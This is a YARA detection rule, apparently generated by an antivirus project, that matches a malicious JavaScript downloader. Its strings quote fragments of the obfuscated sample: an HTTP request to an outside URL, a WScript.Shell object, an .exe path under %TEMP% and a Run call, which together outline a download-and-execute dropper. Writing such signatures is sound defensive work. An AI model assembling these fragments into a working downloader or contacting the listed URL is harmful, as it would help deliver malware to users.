rule sig_20160401_79963614471362b0ab3ed9acae17bfea {
  meta:
    description = "datamaliciousorder - file 20160401_79963614471362b0ab3ed9acae17bfea.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f0b253fbec49c7dc760e32f74d3a470af2728d032d6d99cd7238541bfaad43e1"

  strings:
    $s1  = "LpZu[LhYzi](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "var WzqImv = function MlYt() {return WScript[UnLq](\"WScript\"+\".Shell\");}(), FdyYu = 11;" fullword ascii
    $s3  = "function TaYlj(QlkTz, ZmjFfj){VrcZt = VrcZt * 1; return QlkTz - ZmjFfj;};" fullword ascii
    $s4  = "if (LpZu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XnMv() {return WzqImv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yWu0BcvWX2vNeZ.ex\" + \"e\";};" fullword ascii
    $s6  = "function SynSz() {return ((NlLbl == true) && (NlLbl == WfzRo)) ? 1 : VrcZt;};" fullword ascii
    $s7  = "return TaYlj(CrmKhy, GfEfi);" fullword ascii
    $s8  = "function BfmDfo(ZjFrv) {var SrrMf = (1, 2, 3, 4, 5, ZjFrv); return SrrMf;};" fullword ascii
    $s9  = "var NkhZa = new this[\"Date\"]();" fullword ascii
    $s10 = "WfzRo = true; " fullword ascii
    $s11 = "function SvGa(SewAe){WzqImv[\"R\"+\"un\"](SewAe, VrcZt, VrcZt);};" fullword ascii
    $s12 = "function NzNsg(){return 23;};" fullword ascii
    $s13 = "NlLbl = true; " fullword ascii
    $s14 = "function BhCfr(){return UnLq;};" fullword ascii
    $s15 = "var NlLbl = false;" fullword ascii
    $s16 = "function RtJwu(){return SukCat + \"\";};" fullword ascii
    $s17 = "}while (ItDrp);" fullword ascii
    $s18 = "var WfzRo = false;" fullword ascii
    $s19 = "var HnWg = false;" fullword ascii
    $s20 = "function YbZwl()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}